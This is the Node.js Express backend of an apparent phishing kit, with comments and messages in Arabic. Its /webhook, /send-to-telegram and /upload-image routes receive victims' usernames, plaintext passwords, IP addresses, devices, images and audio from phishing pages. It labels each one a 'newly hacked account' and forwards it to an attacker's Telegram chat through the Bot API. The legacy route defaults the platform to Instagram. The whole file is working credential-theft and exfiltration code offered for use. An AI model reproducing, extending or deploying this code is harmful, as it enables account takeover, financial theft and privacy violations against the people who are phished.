require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// تكوين multer للتعامل مع رفع الملفات (الذاكرة المؤقتة)
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// الحصول على التوكن من متغير البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// التحقق من وجود التوكن
if (!BOT_TOKEN) {
  console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
}

// وظيفة لإرسال رسالة إلى Telegram
async function sendToTelegram(chatId, message, fileBuffer = null, filename = null, isImage = false) {
  try {
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
      if (fileBuffer) {
        console.log(`📁 [محاكاة] مع ملف: ${filename} (صورة: ${isImage})`);
      }
      return true;
    }

    if (fileBuffer && filename) {
      const formData = new FormData();
      
      if (isImage) {
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        
        const mimeType = getMimeType(filename);
        formData.append('photo', fileBuffer, { 
          filename: filename,
          contentType: mimeType 
        });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
          headers: formData.getHeaders()
        });
        
        return response.data.ok;
      } else {
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('document', fileBuffer, { filename: filename });
        
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
          headers: formData.getHeaders()
        });
        
        return response.data.ok;
      }
    } else {
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      return response.data.ok;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// وظيفة مساعدة لتحديد نوع MIME
function getMimeType(filename) {
  const ext = path.extname(filename).toLowerCase();
  const mimeTypes = {
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.png': 'image/png',
    '.gif': 'image/gif',
    '.bmp': 'image/bmp',
    '.webp': 'image/webp'
  };
  return mimeTypes[ext] || 'image/jpeg';
}

// ========== Routes لـ Telegram Bot ==========

// نقطة النهاية الرئيسية لاستقبال البيانات من المواقع (بدون معرفة رابط السيرفر)
app.post('/webhook', async (req, res) => {
  try {
    const { 
      type,           // نوع البيانات: 'login', 'register', 'image', 'audio', etc.
      data,           // البيانات الرئيسية
      chatId,         // معرف Telegram
      platform,       // المنصة
      additionalInfo  // معلومات إضافية
    } = req.body;

    if (!type || !chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'Type and chatId are required' 
      });
    }

    let message = '';
    let fileBuffer = null;
    let filename = null;
    let isImage = false;

    // معالجة不同类型的 البيانات
    switch (type) {
      case 'login':
        const { username, password, amount, device } = data;
        const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'غير معروف';
        
        message = `♦️ - تم اختراق حساب جديد 
🔹 - اسم المستخدم: ${username}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount || 'غير محدد'}
📱 - الجهاز: ${device || 'غير معروف'}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform || 'غير محدد'}`;
        break;

      case 'register':
        const { user, pass, ip } = data;
        message = `📝 تسجيل حساب جديد
👤 اسم المستخدم: ${user}
🔐 كلمة المرور: ${pass}
🌐 عنوان IP: ${ip || 'غير معروف'}
🔄 المنصة: ${platform || 'غير محدد'}`;
        break;

      case 'image':
        if (req.files && req.files.image) {
          fileBuffer = req.files.image.data;
          filename = `image-${Date.now()}.jpg`;
          isImage = true;
        }
        message = `🖼️ تم اختراق صورة جديدة\n👤 المستخدم: ${data.username || 'غير معروف'}`;
        if (data.imageType) message += `\n📸 نوع الصورة: ${data.imageType}`;
        break;

      case 'audio':
        if (req.files && req.files.audio) {
          fileBuffer = req.files.audio.data;
          filename = `audio-${Date.now()}.mp3`;
        }
        message = `🎵 تم تسجيل صوت جديد\n👤 المستخدم: ${data.username || 'غير معروف'}`;
        break;

      default:
        message = `📨 بيانات جديدة\n${JSON.stringify(data, null, 2)}`;
        break;
    }

    // إضافة المعلومات الإضافية إذا وجدت
    if (additionalInfo) {
      message += `\n📋 معلومات إضافية: ${additionalInfo}`;
    }

    const success = await sendToTelegram(chatId, message, fileBuffer, filename, isImage);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح'
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال البيانات إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing webhook:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// Routes القديمة (للتوافق مع الإصدارات السابقة)
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
    
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "غير معروف";
    let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'غير معروف';
    
    const message = `♦️ - تم اختراق حساب جديد 
🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform}`;

    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.json({ success: true, message: 'تم الإرسال بنجاح' });
    } else {
      res.status(500).json({ success: false, message: 'فشل في الإرسال' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// نقطة النهاية لاستقبال الصور
app.post('/upload-image', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, error: 'No image file provided' });
    }

    const { username, imageType, chatId } = req.body;
    
    let message = `🖼️ تم اختراق صورة جديدة`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
    
    const success = await sendToTelegram(
      chatId, 
      message, 
      req.file.buffer, 
      `image-${Date.now()}${path.extname(req.file.originalname || '.jpg')}`,
      true
    );
    
    if (success) {
      res.status(200).json({ success: true, message: 'تم إرسال الصورة بنجاح' });
    } else {
      res.status(500).json({ success: false, error: 'فشل في إرسال الصورة' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// نقطة النهاية للتحقق من عمل السيرفر
app.get('/health', (req, res) => {
  res.status(200).json({ 
    success: true,
    status: 'Server is running',
    tokenConfigured: !!BOT_TOKEN
  });
});

// Route رئيسي بسيط
app.get('/', (req, res) => {
  res.status(200).json({ 
    success: true,
    message: 'مرحباً بك في سيرفر Telegram Bot',
    webhook: 'استخدم /webhook لإرسال البيانات'
  });
});

// بدء السيرفر
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  if (!BOT_TOKEN) {
    console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
  }
});
